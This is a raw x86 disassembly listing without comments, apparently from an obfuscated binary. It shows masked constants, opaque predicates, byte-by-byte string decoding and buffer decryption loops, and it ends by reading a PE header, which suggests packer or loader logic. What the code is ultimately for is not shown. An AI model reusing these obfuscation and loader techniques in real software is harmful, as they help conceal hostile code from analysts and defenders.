  4209c5:	mov    ecx,DWORD PTR [ebp-0x8]
  4209c8:	movzx  eax,BYTE PTR [eax+ecx*1+0x3272fa]
  4209d0:	mov    ecx,DWORD PTR [ebp-0xe0]
  4209d6:	xor    ecx,ebx
  4209d8:	lea    eax,[ecx+eax*1+0x3272fa]
  4209df:	movzx  ecx,BYTE PTR [ebp-0x2]
  4209e3:	xor    ecx,eax
  4209e5:	mov    BYTE PTR [ebp-0x2],cl
  4209e8:	mov    al,BYTE PTR [ebp-0x2]
  4209eb:	mov    ecx,DWORD PTR [ebp-0x1c]
  4209ee:	mov    edx,DWORD PTR [ebp-0x48]
  4209f1:	xor    ecx,ebx
  4209f3:	add    ecx,esi
  4209f5:	imul   ecx,edx
  4209f8:	mov    edx,DWORD PTR [ebp-0x8]
  4209fb:	mov    BYTE PTR [ecx+edx*1],al
  4209fe:	mov    eax,DWORD PTR [ebp-0x1c]
  420a01:	mov    ecx,DWORD PTR [ebp-0x48]
  420a04:	xor    eax,ebx
  420a06:	add    eax,esi
  420a08:	imul   eax,ecx
  420a0b:	mov    ecx,DWORD PTR [ebp-0x8]
  420a0e:	mov    al,BYTE PTR [eax+ecx*1]
  420a11:	mov    BYTE PTR [ebp-0x2],al
  420a14:	mov    eax,DWORD PTR [ebp-0x1c]
  420a17:	mov    ecx,DWORD PTR [ebp-0x48]
  420a1a:	xor    eax,ebx
  420a1c:	add    eax,esi
  420a1e:	imul   eax,ecx
  420a21:	mov    ecx,DWORD PTR [ebp-0x20]
  420a24:	xor    ecx,ebx
  420a26:	add    eax,ecx
  420a28:	mov    ecx,DWORD PTR [ebp-0x8]
  420a2b:	movzx  eax,BYTE PTR [eax+ecx*1+0x3272fa]
  420a33:	mov    ecx,DWORD PTR [ebp-0xc4]
  420a39:	xor    ecx,ebx
  420a3b:	lea    eax,[ecx+eax*1+0x3272fa]
  420a42:	movzx  ecx,BYTE PTR [ebp-0x2]
  420a46:	xor    ecx,eax
  420a48:	mov    BYTE PTR [ebp-0x2],cl
  420a4b:	mov    al,BYTE PTR [ebp-0x2]
  420a4e:	mov    ecx,DWORD PTR [ebp-0x1c]
  420a51:	mov    edx,DWORD PTR [ebp-0x48]
  420a54:	xor    ecx,ebx
  420a56:	add    ecx,esi
  420a58:	imul   ecx,edx
  420a5b:	mov    edx,DWORD PTR [ebp-0x8]
  420a5e:	mov    BYTE PTR [ecx+edx*1],al
  420a61:	mov    eax,DWORD PTR [ebp-0x38]
  420a64:	mov    ecx,DWORD PTR [ebp-0x20]
  420a67:	xor    eax,ebx
  420a69:	xor    ecx,ebx
  420a6b:	add    eax,esi
  420a6d:	add    ecx,esi
  420a6f:	imul   eax,ecx
  420a72:	add    eax,DWORD PTR [ebp-0x48]
  420a75:	mov    DWORD PTR [ebp-0x48],eax
  420a78:	mov    eax,DWORD PTR [ebp-0x48]
  420a7b:	mov    ecx,DWORD PTR [ebp-0x14]
  420a7e:	cmp    ecx,eax
  420a80:	jb     0x420984
  420a86:	mov    eax,DWORD PTR [ebp-0x20]
  420a89:	mov    ecx,DWORD PTR [ebp-0x14]
  420a8c:	xor    eax,ebx
  420a8e:	add    eax,esi
  420a90:	imul   eax,ecx
  420a93:	mov    ecx,DWORD PTR [ebp-0x24]
  420a96:	xor    ecx,ebx
  420a98:	add    ecx,esi
  420a9a:	or     eax,ecx
  420a9c:	mov    ecx,DWORD PTR [ebp-0x30]
  420a9f:	xor    ecx,ebx
  420aa1:	add    eax,ecx
  420aa3:	mov    ecx,DWORD PTR [ebp-0x30]
  420aa6:	xor    ecx,ebx
  420aa8:	add    eax,ecx
  420aaa:	mov    ecx,DWORD PTR [ebp-0xc]
  420aad:	lea    eax,[eax+ecx*1+0x64e5f4]
  420ab4:	jmp    0x420ac5
  420ab6:	mov    eax,DWORD PTR [ebp-0x30]
  420ab9:	mov    ecx,DWORD PTR [ebp-0xc]
  420abc:	xor    eax,ebx
  420abe:	lea    eax,[eax+ecx*1+0x3272fa]
  420ac5:	mov    DWORD PTR [ebp-0xc],eax
  420ac8:	mov    eax,DWORD PTR [ebp-0x30]
  420acb:	xor    eax,ebx
  420acd:	mov    ecx,0xffcd8d06
  420ad2:	sub    ecx,eax
  420ad4:	add    ecx,DWORD PTR [ebp-0x28]
  420ad7:	mov    eax,DWORD PTR [ebp-0x30]
  420ada:	mov    edx,DWORD PTR [ebp-0xc]
  420add:	xor    eax,ebx
  420adf:	add    eax,esi
  420ae1:	imul   eax,edx
  420ae4:	cmp    eax,ecx
  420ae6:	jbe    0x4208f8
  420aec:	mov    eax,DWORD PTR [ebp-0x10]
  420aef:	mov    ecx,DWORD PTR [ebp-0x3c]
  420af2:	mov    eax,DWORD PTR [ebp+0x8]
  420af5:	mov    edx,DWORD PTR [ebp-0x54]
  420af8:	mov    eax,DWORD PTR [eax+0x1e0]
  420afe:	xor    edx,ebx
  420b00:	add    edx,esi
  420b02:	push   edx
  420b03:	mov    edx,DWORD PTR [ebp-0x40]
  420b06:	xor    edx,ebx
  420b08:	add    edx,esi
  420b0a:	push   edx
  420b0b:	push   ecx
  420b0c:	mov    DWORD PTR [ebp-0x38],ecx
  420b0f:	mov    ecx,DWORD PTR [ebp-0x10]
  420b12:	xor    ecx,ebx
  420b14:	add    ecx,esi
  420b16:	push   ecx
  420b17:	call   DWORD PTR [eax+0x14]
  420b1a:	mov    edi,eax
  420b1c:	mov    eax,DWORD PTR [ebp-0x10]
  420b1f:	xor    eax,ebx
  420b21:	add    eax,esi
  420b23:	cmp    eax,edi
  420b25:	je     0x420b80
  420b27:	mov    eax,DWORD PTR [ebp-0x10]
  420b2a:	jmp    0x420b4d
  420b2c:	mov    ecx,DWORD PTR [ebp-0x2c]
  420b2f:	xor    eax,ebx
  420b31:	mov    cl,BYTE PTR [ecx+eax*1+0x3272fa]
  420b38:	mov    BYTE PTR [eax+edi*1+0x3272fa],cl
  420b3f:	mov    ecx,DWORD PTR [ebp-0x18]
  420b42:	xor    ecx,ebx
  420b44:	lea    eax,[ecx+eax*1+0x3272fa]
  420b4b:	xor    eax,ebx
  420b4d:	mov    ecx,DWORD PTR [ebp-0x3c]
  420b50:	sub    ecx,esi
  420b52:	xor    ecx,ebx
  420b54:	cmp    eax,ecx
  420b56:	jne    0x420b2c
  420b58:	mov    eax,DWORD PTR [ebp+0x8]
  420b5b:	mov    ecx,DWORD PTR [ebp-0x50]
  420b5e:	mov    eax,DWORD PTR [eax+0x1e0]
  420b64:	xor    ecx,ebx
  420b66:	add    ecx,esi
  420b68:	push   ecx
  420b69:	mov    ecx,DWORD PTR [ebp-0x10]
  420b6c:	xor    ecx,ebx
  420b6e:	add    ecx,esi
  420b70:	push   ecx
  420b71:	push   DWORD PTR [ebp-0x2c]
  420b74:	call   DWORD PTR [eax+0x18]
  420b77:	mov    eax,DWORD PTR [ebp-0x38]
  420b7a:	mov    DWORD PTR [ebp-0x2c],edi
  420b7d:	mov    DWORD PTR [ebp-0x3c],eax
  420b80:	mov    eax,DWORD PTR [ebp-0x2c]
  420b83:	mov    DWORD PTR [ebp-0x14],eax
  420b86:	mov    eax,DWORD PTR [ebp-0x18]
  420b89:	mov    ecx,DWORD PTR [ebp-0x10]
  420b8c:	xor    eax,ebx
  420b8e:	add    eax,esi
  420b90:	mov    DWORD PTR [ebp-0x5c],0xbad3cbd3
  420b97:	mov    DWORD PTR [ebp-0x58],0xc4d3bcd3
  420b9e:	jmp    0x420bd1
  420ba0:	mov    edx,DWORD PTR [ebp-0x14]
  420ba3:	mov    edi,ecx
  420ba5:	xor    edi,ebx
  420ba7:	mov    cl,BYTE PTR [ebp+edi*1+0x32729e]
  420bae:	movsx  edx,BYTE PTR [edi+edx*1+0x3272fa]
  420bb6:	xor    cl,0x81
  420bb9:	add    cl,0x6
  420bbc:	movzx  ecx,cl
  420bbf:	cmp    edx,ecx
  420bc1:	jne    0x420bdb
  420bc3:	mov    ecx,DWORD PTR [ebp-0x18]
  420bc6:	xor    ecx,ebx
  420bc8:	lea    ecx,[ecx+edi*1+0x3272fa]
  420bcf:	xor    ecx,ebx
  420bd1:	cmp    ecx,0xf89c85bd
  420bd7:	jne    0x420ba0
  420bd9:	jmp    0x420be2
  420bdb:	mov    eax,DWORD PTR [ebp-0x10]
  420bde:	xor    eax,ebx
  420be0:	add    eax,esi
  420be2:	mov    ecx,DWORD PTR [ebp-0x10]
  420be5:	xor    ecx,ebx
  420be7:	add    ecx,esi
  420be9:	cmp    ecx,eax
  420beb:	je     0x420d61
  420bf1:	mov    eax,DWORD PTR [ebp-0x14]
  420bf4:	mov    eax,DWORD PTR [eax+0x8]
  420bf7:	mov    DWORD PTR [ebp-0xc],0xf89c85b5
  420bfe:	mov    DWORD PTR [ebp-0x40],0xf89cc3c6
  420c05:	mov    DWORD PTR [ebp-0x44],0xf89cb5b5
  420c0c:	mov    DWORD PTR [ebp-0x24],0xf89c85b9
  420c13:	mov    DWORD PTR [ebp-0x20],eax
  420c16:	mov    eax,DWORD PTR [ebp+0x8]
  420c19:	mov    ecx,DWORD PTR [ebp-0x24]
  420c1c:	xor    ecx,ebx
  420c1e:	add    ecx,esi
  420c20:	push   ecx
  420c21:	mov    ecx,DWORD PTR [ebp-0x44]
  420c24:	mov    eax,DWORD PTR [eax+0x1e0]
  420c2a:	xor    ecx,ebx
  420c2c:	add    ecx,esi
  420c2e:	push   ecx
  420c2f:	mov    ecx,DWORD PTR [ebp-0x40]
  420c32:	xor    ecx,ebx
  420c34:	add    ecx,esi
  420c36:	push   ecx
  420c37:	mov    ecx,DWORD PTR [ebp-0xc]
  420c3a:	xor    ecx,ebx
  420c3c:	add    ecx,esi
  420c3e:	push   ecx
  420c3f:	call   DWORD PTR [eax+0x14]
  420c42:	mov    edi,eax
  420c44:	mov    eax,DWORD PTR [ebp+0x8]
  420c47:	mov    ecx,DWORD PTR [ebp-0x24]
  420c4a:	mov    eax,DWORD PTR [eax+0x1e0]
  420c50:	xor    ecx,ebx
  420c52:	add    ecx,esi
  420c54:	push   ecx
  420c55:	mov    ecx,DWORD PTR [ebp-0x44]
  420c58:	xor    ecx,ebx
  420c5a:	add    ecx,esi
  420c5c:	push   ecx
  420c5d:	mov    ecx,DWORD PTR [ebp-0xc]
  420c60:	push   DWORD PTR [ebp-0x20]
  420c63:	xor    ecx,ebx
  420c65:	add    ecx,esi
  420c67:	push   ecx
  420c68:	call   DWORD PTR [eax+0x14]
  420c6b:	mov    ecx,DWORD PTR [ebp-0xc]
  420c6e:	xor    ecx,ebx
  420c70:	add    ecx,esi
  420c72:	mov    DWORD PTR [ebp-0x24],eax
  420c75:	cmp    ecx,edi
  420c77:	je     0x421004
  420c7d:	mov    ecx,DWORD PTR [ebp-0xc]
  420c80:	xor    ecx,ebx
  420c82:	add    ecx,esi
  420c84:	cmp    ecx,eax
  420c86:	je     0x421004
  420c8c:	mov    DWORD PTR [ebp-0x40],0xf89c85ba
  420c93:	mov    DWORD PTR [ebp-0x54],0xf89c85bb
  420c9a:	mov    ecx,DWORD PTR [ebp-0x40]
  420c9d:	xor    cl,0xb3
  420ca0:	sub    cl,0x6
  420ca3:	mov    BYTE PTR [edi],cl
  420ca5:	mov    ecx,DWORD PTR [ebp-0xc]
  420ca8:	xor    cl,0xb3
  420cab:	sub    cl,0x6
  420cae:	mov    BYTE PTR [edi+0x1],cl
  420cb1:	mov    ecx,DWORD PTR [ebp-0x54]
  420cb4:	xor    cl,0xb3
  420cb7:	sub    cl,0x6
  420cba:	mov    BYTE PTR [edi+0x2],cl
  420cbd:	and    DWORD PTR [ebp-0xc8],0x0
  420cc4:	and    DWORD PTR [ebp-0xdc],0x0
  420ccb:	lea    ecx,[ebp-0xdc]
  420cd1:	push   ecx
  420cd2:	push   DWORD PTR [ebp-0x20]
  420cd5:	push   eax
  420cd6:	lea    eax,[ebp-0xc8]
  420cdc:	push   eax
  420cdd:	mov    eax,DWORD PTR [ebp-0x14]
  420ce0:	push   DWORD PTR [eax+0xc]
  420ce3:	mov    eax,DWORD PTR [ebp-0x2c]
  420ce6:	add    eax,0x10
  420ce9:	push   eax
  420cea:	push   edi
  420ceb:	call   0x41ff8f
  420cf0:	mov    DWORD PTR [ebp-0x40],eax
  420cf3:	mov    eax,DWORD PTR [ebp+0x8]
  420cf6:	mov    ecx,DWORD PTR [ebp-0x50]
  420cf9:	mov    eax,DWORD PTR [eax+0x1e0]
  420cff:	xor    ecx,ebx
  420d01:	add    ecx,esi
  420d03:	push   ecx
  420d04:	mov    ecx,DWORD PTR [ebp-0xc]
  420d07:	xor    ecx,ebx
  420d09:	add    ecx,esi
  420d0b:	push   ecx
  420d0c:	push   edi
  420d0d:	call   DWORD PTR [eax+0x18]
  420d10:	mov    eax,DWORD PTR [ebp-0x40]
  420d13:	add    eax,0xffcd8d06
  420d18:	xor    eax,ebx
  420d1a:	cmp    eax,0xf89c85b5
  420d1f:	mov    eax,DWORD PTR [ebp+0x8]
  420d22:	mov    eax,DWORD PTR [eax+0x1e0]
  420d28:	mov    ecx,DWORD PTR [ebp-0x50]
  420d2b:	jne    0x420d4e
  420d2d:	xor    ecx,ebx
  420d2f:	add    ecx,esi
  420d31:	push   ecx
  420d32:	mov    ecx,DWORD PTR [ebp-0xc]
  420d35:	xor    ecx,ebx
  420d37:	add    ecx,esi
  420d39:	push   ecx
  420d3a:	push   DWORD PTR [ebp-0x2c]
  420d3d:	call   DWORD PTR [eax+0x18]
  420d40:	mov    eax,DWORD PTR [ebp-0x24]
  420d43:	mov    DWORD PTR [ebp-0x2c],eax
  420d46:	mov    eax,DWORD PTR [ebp-0x20]
  420d49:	mov    DWORD PTR [ebp-0x3c],eax
  420d4c:	jmp    0x420d61
  420d4e:	xor    ecx,ebx
  420d50:	add    ecx,esi
  420d52:	push   ecx
  420d53:	mov    ecx,DWORD PTR [ebp-0xc]
  420d56:	xor    ecx,ebx
  420d58:	add    ecx,esi
  420d5a:	push   ecx
  420d5b:	push   DWORD PTR [ebp-0x24]
  420d5e:	call   DWORD PTR [eax+0x18]
  420d61:	mov    eax,DWORD PTR [ebp-0x3c]
  420d64:	mov    DWORD PTR [ebp-0x34],eax
  420d67:	mov    eax,DWORD PTR [ebp-0x2c]
  420d6a:	mov    DWORD PTR [ebp-0x28],0xf89c85b5
  420d71:	mov    DWORD PTR [ebp-0x40],eax
  420d74:	mov    edi,0xf89c85b4
  420d79:	mov    DWORD PTR [ebp-0x30],edi
  420d7c:	mov    eax,DWORD PTR [ebp-0x28]
  420d7f:	xor    eax,ebx
  420d81:	add    eax,esi
  420d83:	mov    DWORD PTR [ebp-0xc],eax
  420d86:	mov    eax,DWORD PTR [ebp-0x28]
  420d89:	xor    eax,ebx
  420d8b:	add    eax,esi
  420d8d:	mov    DWORD PTR [ebp-0x14],eax
  420d90:	mov    DWORD PTR [ebp-0x44],0xf89c8595
  420d97:	mov    DWORD PTR [ebp-0x24],0xf89c85be
  420d9e:	mov    eax,DWORD PTR [ebp-0x28]
  420da1:	mov    ecx,DWORD PTR [ebp-0x34]
  420da4:	xor    eax,ebx
  420da6:	add    eax,esi
  420da8:	cmp    ecx,eax
  420daa:	je     0x420fa0
  420db0:	jmp    0x420f7c
  420db5:	mov    ecx,DWORD PTR [ebp-0xc]
  420db8:	mov    eax,DWORD PTR [ebp-0x34]
  420dbb:	sub    eax,ecx
  420dbd:	mov    ecx,DWORD PTR [ebp-0x44]
  420dc0:	xor    ecx,ebx
  420dc2:	add    ecx,esi
  420dc4:	xor    edx,edx
  420dc6:	div    ecx
  420dc8:	mov    DWORD PTR [ebp-0x14],eax
  420dcb:	mov    eax,DWORD PTR [ebp-0x24]
  420dce:	mov    ecx,DWORD PTR [ebp-0x14]
  420dd1:	xor    eax,ebx
  420dd3:	add    eax,esi
  420dd5:	cmp    ecx,eax
  420dd7:	jbe    0x420de3
  420dd9:	mov    eax,DWORD PTR [ebp-0x24]
  420ddc:	xor    eax,ebx
  420dde:	add    eax,esi
  420de0:	mov    DWORD PTR [ebp-0x14],eax
  420de3:	mov    eax,DWORD PTR [ebp-0x44]
  420de6:	mov    ecx,DWORD PTR [ebp-0x14]
  420de9:	xor    eax,ebx
  420deb:	add    eax,esi
  420ded:	imul   eax,ecx
  420df0:	mov    DWORD PTR [ebp-0x14],eax
  420df3:	mov    eax,DWORD PTR [ebp-0x28]
  420df6:	mov    ecx,DWORD PTR [ebp-0x14]
  420df9:	xor    eax,ebx
  420dfb:	add    eax,esi
  420dfd:	cmp    ecx,eax
  420dff:	je     0x420f6a
  420e05:	mov    eax,DWORD PTR [ebp-0x14]
  420e08:	mov    DWORD PTR [ebp-0x20],eax
  420e0b:	mov    eax,DWORD PTR [ebp-0xc]
  420e0e:	add    eax,DWORD PTR [ebp-0x40]
  420e11:	mov    DWORD PTR [ebp-0x4c],0xf89c85b5
  420e18:	mov    DWORD PTR [ebp-0x14],edi
  420e1b:	mov    DWORD PTR [ebp-0x54],0xf89c85bb
  420e22:	mov    DWORD PTR [ebp-0x1c],eax
  420e25:	mov    DWORD PTR [ebp-0x38],0xf89c85ba
  420e2c:	mov    DWORD PTR [ebp-0x8],edi
  420e2f:	mov    eax,DWORD PTR [ebp-0x4c]
  420e32:	xor    eax,ebx
  420e34:	add    eax,esi
  420e36:	jmp    0x420f29
  420e3b:	mov    DWORD PTR [ebp-0xe4],0xf89c85a2
  420e45:	mov    DWORD PTR [ebp-0xd0],0xf89c85af
  420e4f:	mov    eax,DWORD PTR [ebp-0x8]
  420e52:	mov    ecx,DWORD PTR [ebp-0x18]
  420e55:	xor    eax,ebx
  420e57:	add    eax,esi
  420e59:	imul   eax,ecx
  420e5c:	mov    ecx,DWORD PTR [ebp-0x1c]
  420e5f:	mov    al,BYTE PTR [eax+ecx*1]
  420e62:	mov    BYTE PTR [ebp-0x1],al
  420e65:	mov    eax,DWORD PTR [ebp-0x8]
  420e68:	mov    ecx,DWORD PTR [ebp-0x18]
  420e6b:	xor    eax,ebx
  420e6d:	add    eax,esi
  420e6f:	imul   eax,ecx
  420e72:	mov    ecx,DWORD PTR [ebp-0x54]
  420e75:	xor    ecx,ebx
  420e77:	add    eax,ecx
  420e79:	mov    ecx,DWORD PTR [ebp-0x1c]
  420e7c:	movzx  eax,BYTE PTR [eax+ecx*1+0x3272fa]
  420e84:	mov    ecx,DWORD PTR [ebp-0xe4]
  420e8a:	xor    ecx,ebx
  420e8c:	lea    eax,[ecx+eax*1+0x3272fa]
  420e93:	movzx  ecx,BYTE PTR [ebp-0x1]
  420e97:	xor    ecx,eax
  420e99:	mov    BYTE PTR [ebp-0x1],cl
  420e9c:	mov    al,BYTE PTR [ebp-0x1]
  420e9f:	mov    ecx,DWORD PTR [ebp-0x8]
  420ea2:	mov    edx,DWORD PTR [ebp-0x18]
  420ea5:	xor    ecx,ebx
  420ea7:	add    ecx,esi
  420ea9:	imul   ecx,edx
  420eac:	mov    edx,DWORD PTR [ebp-0x1c]
  420eaf:	mov    BYTE PTR [ecx+edx*1],al
  420eb2:	mov    eax,DWORD PTR [ebp-0x8]
  420eb5:	mov    ecx,DWORD PTR [ebp-0x18]
  420eb8:	xor    eax,ebx
  420eba:	add    eax,esi
  420ebc:	imul   eax,ecx
  420ebf:	mov    ecx,DWORD PTR [ebp-0x1c]
  420ec2:	mov    al,BYTE PTR [eax+ecx*1]
  420ec5:	mov    BYTE PTR [ebp-0x1],al
  420ec8:	mov    eax,DWORD PTR [ebp-0x8]
  420ecb:	mov    ecx,DWORD PTR [ebp-0x18]
  420ece:	xor    eax,ebx
  420ed0:	add    eax,esi
  420ed2:	imul   eax,ecx
  420ed5:	mov    ecx,DWORD PTR [ebp-0x14]
  420ed8:	xor    ecx,ebx
  420eda:	add    eax,ecx
  420edc:	mov    ecx,DWORD PTR [ebp-0x1c]
  420edf:	movzx  eax,BYTE PTR [eax+ecx*1+0x3272fa]
  420ee7:	mov    ecx,DWORD PTR [ebp-0xd0]
  420eed:	xor    ecx,ebx
  420eef:	lea    eax,[ecx+eax*1+0x3272fa]
  420ef6:	movzx  ecx,BYTE PTR [ebp-0x1]
  420efa:	xor    ecx,eax
  420efc:	mov    BYTE PTR [ebp-0x1],cl
  420eff:	mov    al,BYTE PTR [ebp-0x1]
  420f02:	mov    ecx,DWORD PTR [ebp-0x8]
  420f05:	mov    edx,DWORD PTR [ebp-0x18]
  420f08:	xor    ecx,ebx
  420f0a:	add    ecx,esi
  420f0c:	imul   ecx,edx
  420f0f:	mov    edx,DWORD PTR [ebp-0x1c]
  420f12:	mov    BYTE PTR [ecx+edx*1],al
  420f15:	mov    eax,DWORD PTR [ebp-0x38]
  420f18:	mov    ecx,DWORD PTR [ebp-0x14]
  420f1b:	xor    eax,ebx
  420f1d:	xor    ecx,ebx
  420f1f:	add    eax,esi
  420f21:	add    ecx,esi
  420f23:	imul   eax,ecx
  420f26:	add    eax,DWORD PTR [ebp-0x18]
  420f29:	mov    DWORD PTR [ebp-0x18],eax
  420f2c:	mov    eax,DWORD PTR [ebp-0x18]
  420f2f:	mov    ecx,DWORD PTR [ebp-0x20]
  420f32:	cmp    ecx,eax
  420f34:	jb     0x420e3b
  420f3a:	mov    eax,DWORD PTR [ebp-0x14]
  420f3d:	mov    ecx,DWORD PTR [ebp-0x20]
  420f40:	xor    eax,ebx
  420f42:	add    eax,esi
  420f44:	imul   eax,ecx
  420f47:	mov    ecx,DWORD PTR [ebp-0x4c]
  420f4a:	xor    ecx,ebx
  420f4c:	add    ecx,esi
  420f4e:	or     eax,ecx
  420f50:	mov    ecx,DWORD PTR [ebp-0x30]
  420f53:	xor    ecx,ebx
  420f55:	add    eax,ecx
  420f57:	mov    ecx,DWORD PTR [ebp-0x30]
  420f5a:	xor    ecx,ebx
  420f5c:	add    eax,ecx
  420f5e:	mov    ecx,DWORD PTR [ebp-0xc]
  420f61:	lea    eax,[eax+ecx*1+0x64e5f4]
  420f68:	jmp    0x420f79
  420f6a:	mov    eax,DWORD PTR [ebp-0x30]
  420f6d:	mov    ecx,DWORD PTR [ebp-0xc]
  420f70:	xor    eax,ebx
  420f72:	lea    eax,[eax+ecx*1+0x3272fa]
  420f79:	mov    DWORD PTR [ebp-0xc],eax
  420f7c:	mov    eax,DWORD PTR [ebp-0x30]
  420f7f:	xor    eax,ebx
  420f81:	mov    ecx,0xffcd8d06
  420f86:	sub    ecx,eax
  420f88:	add    ecx,DWORD PTR [ebp-0x34]
  420f8b:	mov    eax,DWORD PTR [ebp-0x30]
  420f8e:	mov    edx,DWORD PTR [ebp-0xc]
  420f91:	xor    eax,ebx
  420f93:	add    eax,esi
  420f95:	imul   eax,edx
  420f98:	cmp    eax,ecx
  420f9a:	jbe    0x420db5
  420fa0:	push   DWORD PTR [ebp+0x8]
  420fa3:	mov    eax,DWORD PTR [ebp+0x8]
  420fa6:	push   DWORD PTR [eax+0x1cc]
  420fac:	lea    eax,[ebp-0xd8]
  420fb2:	push   eax
  420fb3:	mov    eax,DWORD PTR [ebp+0x8]
  420fb6:	mov    eax,DWORD PTR [eax+0x1c4]
  420fbc:	push   DWORD PTR [eax]
  420fbe:	mov    eax,DWORD PTR [ebp+0x8]
  420fc1:	mov    eax,DWORD PTR [eax+0x1c0]
  420fc7:	push   DWORD PTR [eax]
  420fc9:	push   DWORD PTR [ebp-0x3c]
  420fcc:	push   DWORD PTR [ebp-0x2c]
  420fcf:	call   0x421a66
  420fd4:	mov    DWORD PTR [ebp-0x40],eax
  420fd7:	mov    eax,DWORD PTR [ebp-0x10]
  420fda:	mov    ecx,DWORD PTR [ebp-0x2c]
  420fdd:	xor    eax,ebx
  420fdf:	add    eax,esi
  420fe1:	cmp    eax,ecx
  420fe3:	je     0x421004
  420fe5:	mov    eax,DWORD PTR [ebp+0x8]
  420fe8:	mov    ecx,DWORD PTR [ebp-0x50]
  420feb:	mov    eax,DWORD PTR [eax+0x1e0]
  420ff1:	xor    ecx,ebx
  420ff3:	add    ecx,esi
  420ff5:	push   ecx
  420ff6:	mov    ecx,DWORD PTR [ebp-0x10]
  420ff9:	xor    ecx,ebx
  420ffb:	add    ecx,esi
  420ffd:	push   ecx
  420ffe:	push   DWORD PTR [ebp-0x2c]
  421001:	call   DWORD PTR [eax+0x18]
  421004:	pop    edi
  421005:	pop    esi
  421006:	pop    ebx
  421007:	leave  
  421008:	ret    0x4
  42100b:	push   ebp
  42100c:	mov    ebp,esp
  42100e:	push   ecx
  42100f:	push   ecx
  421010:	lea    eax,[ebp-0x8]
  421013:	mov    DWORD PTR [ebp-0x4],eax
  421016:	push   esi
  421017:	mov    esi,DWORD PTR [ebp-0x4]
  42101a:	mov    eax,0xf881bacf
  42101f:	mov    DWORD PTR [esi],eax
  421021:	mov    esi,DWORD PTR [ebp-0x8]
  421024:	cmp    esi,eax
  421026:	pop    esi
  421027:	jne    0x421031
  421029:	mov    BYTE PTR [ecx+0xa],0x7b
  42102d:	mov    BYTE PTR [edx+0x8],0xcc
  421031:	mov    BYTE PTR [edx+0xa],0x7b
  421035:	mov    BYTE PTR [ecx+0x2],0xe9
  421039:	leave  
  42103a:	ret    
  42103b:	push   ebp
  42103c:	mov    ebp,esp
  42103e:	push   ecx
  42103f:	push   ecx
  421040:	lea    eax,[ebp-0x8]
  421043:	mov    DWORD PTR [ebp-0x4],eax
  421046:	mov    edx,DWORD PTR [ebp-0x4]
  421049:	mov    eax,0xf88b0bd3
  42104e:	mov    DWORD PTR [edx],eax
  421050:	mov    edx,DWORD PTR [ebp-0x8]
  421053:	cmp    edx,eax
  421055:	jne    0x421066
  421057:	mov    eax,DWORD PTR [ebp+0x8]
  42105a:	mov    BYTE PTR [ecx+0x9],0xef
  42105e:	mov    BYTE PTR [eax+0x7],0xa4
  421062:	mov    BYTE PTR [ecx+0x6],0xec
  421066:	mov    BYTE PTR [ecx+0x3],0xdf
  42106a:	leave  
  42106b:	ret    0x4
  42106e:	push   ebp
  42106f:	mov    ebp,esp
  421071:	push   ecx
  421072:	push   ecx
  421073:	lea    eax,[ebp-0x8]
  421076:	mov    DWORD PTR [ebp-0x4],eax
  421079:	mov    edx,DWORD PTR [ebp-0x4]
  42107c:	mov    eax,0x7e0dacf
  421081:	mov    DWORD PTR [edx],eax
  421083:	mov    edx,DWORD PTR [ebp-0x8]
  421086:	cmp    edx,eax
  421088:	jne    0x42108e
  42108a:	mov    BYTE PTR [ecx+0x7],0xa4
  42108e:	mov    eax,DWORD PTR [ebp+0x8]
  421091:	mov    BYTE PTR [ecx+0x1],0xe2
  421095:	mov    BYTE PTR [eax+0x9],0xcf
  421099:	leave  
  42109a:	ret    0x4
  42109d:	push   ebp
  42109e:	mov    ebp,esp
  4210a0:	push   ecx
  4210a1:	push   ecx
  4210a2:	lea    eax,[ebp-0x8]
  4210a5:	mov    DWORD PTR [ebp-0x4],eax
  4210a8:	push   esi
  4210a9:	mov    esi,DWORD PTR [ebp-0x4]
  4210ac:	mov    eax,0x7060e3e
  4210b1:	mov    DWORD PTR [esi],eax
  4210b3:	mov    esi,DWORD PTR [ebp-0x8]
  4210b6:	cmp    esi,eax
  4210b8:	pop    esi
  4210b9:	jne    0x4210c5
  4210bb:	mov    BYTE PTR [edx+0x4],0xe8
  4210bf:	mov    WORD PTR [ecx+0x3],0xe8df
  4210c5:	mov    BYTE PTR [edx],0xbc
  4210c8:	leave  
  4210c9:	ret    
  4210ca:	push   ebp
  4210cb:	mov    ebp,esp
  4210cd:	push   ecx
  4210ce:	push   ecx
  4210cf:	lea    eax,[ebp-0x8]
  4210d2:	mov    DWORD PTR [ebp-0x4],eax
  4210d5:	mov    edx,DWORD PTR [ebp-0x4]
  4210d8:	mov    eax,0xf8870b3f
  4210dd:	mov    DWORD PTR [edx],eax
  4210df:	mov    edx,DWORD PTR [ebp-0x8]
  4210e2:	cmp    edx,eax
  4210e4:	jne    0x4210f1
  4210e6:	mov    eax,DWORD PTR [ebp+0x8]
  4210e9:	mov    BYTE PTR [ecx+0x8],0xec
  4210ed:	mov    BYTE PTR [eax+0x1],0xe2
  4210f1:	mov    BYTE PTR [ecx+0x5],0xf0
  4210f5:	leave  
  4210f6:	ret    0x4
  4210f9:	push   esi
  4210fa:	mov    ecx,edi
  4210fc:	call   0x4210ca
  421101:	mov    edx,edi
  421103:	mov    ecx,esi
  421105:	mov    BYTE PTR [esi],0xdc
  421108:	call   0x42109d
  42110d:	push   esi
  42110e:	mov    ecx,edi
  421110:	mov    BYTE PTR [esi+0x5],0xf0
  421114:	call   0x42106e
  421119:	push   esi
  42111a:	mov    BYTE PTR [esi+0x6],0xec
  42111e:	call   0x42103b
  421123:	mov    BYTE PTR [esi+0x2],0xe9
  421127:	mov    edx,esi
  421129:	jmp    0x42100b
  42112e:	push   ebp
  42112f:	mov    ebp,esp
  421131:	push   ecx
  421132:	mov    ecx,DWORD PTR [edx+0x194]
  421138:	push   esi
  421139:	mov    esi,DWORD PTR [ebp+0x8]
  42113c:	mov    esi,DWORD PTR [esi]
  42113e:	mov    DWORD PTR [ecx],esi
  421140:	mov    ecx,DWORD PTR [edx+0x194]
  421146:	mov    ecx,DWORD PTR [ecx]
  421148:	mov    esi,DWORD PTR [edx+0x190]
  42114e:	mov    DWORD PTR [esi],ecx
  421150:	mov    eax,DWORD PTR [edx+0x194]
  421156:	mov    ecx,DWORD PTR [eax]
  421158:	mov    ecx,DWORD PTR [ecx+0x3c]
  42115b:	add    ecx,DWORD PTR [eax]
  42115d:	mov    DWORD PTR [ebp-0x4],0xf89ca5b5
  421164:	mov    eax,DWORD PTR [ebp-0x4]
  421167:	movzx  ecx,WORD PTR [ecx+0x16]
  42116b:	xor    eax,0x75108b3
  421170:	add    eax,0x3272fa
  421175:	pop    esi
  421176:	test   ecx,eax
  421178:	je     0x421186
